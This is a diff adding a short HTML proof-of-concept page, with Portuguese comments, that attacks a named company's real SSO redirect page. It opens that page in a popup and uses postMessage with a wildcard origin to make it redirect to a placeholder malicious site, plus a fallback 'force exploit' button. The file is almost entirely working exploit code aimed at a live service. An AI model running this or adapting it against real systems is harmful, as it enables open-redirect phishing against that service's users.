@@ -1,0 +1,44 @@
+<!-- index.html -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Exploit de Open Redirect - POC</title>
+</head>
+<body>
+    <h2>POC Exploit </h2>
+  
+    
+    <script>
+        const maliciousURL = "https://meu-site-malicioso.com/malicious-site.html";
+        
+        const victimWindow = window.open("https://uk.office.egress.com/sso/redirect.html?isWebClient=true", "victim", "width=800,height=600");
+        
+        // Função para enviar o evento de redirecionamento
+        function sendExploit() {
+            // Criamos um evento personalizado com a URL maliciosa
+            const event = new CustomEvent("invoke-uri-redirect", {
+                detail: {
+                    uri: maliciousURL
+                }
+            });
+            
+            // Alternativa: usar postMessage para explorar
+            victimWindow.postMessage({
+                type: "invoke-uri-redirect",
+                uri: maliciousURL
+            }, "*");  // O asterisco é importante - permite enviar para qualquer origem
+        }
+        
+        // Esperamos receber a mensagem "ready-for-uri-redirect"
+        window.addEventListener("message", function(event) {
+            if (event.data && event.data.type === "ready-for-uri-redirect") {
+                console.log("Recebido sinal de prontidão, enviando exploit...");
+                setTimeout(sendExploit, 1000);  // Enviar após um segundo
+            }
+        });
+        
+        // Botão de fallback caso o automático não funcione
+        document.write('<button onclick="sendExploit()">Forçar Exploit</button>');
+    </script>
+</body>
+</html>
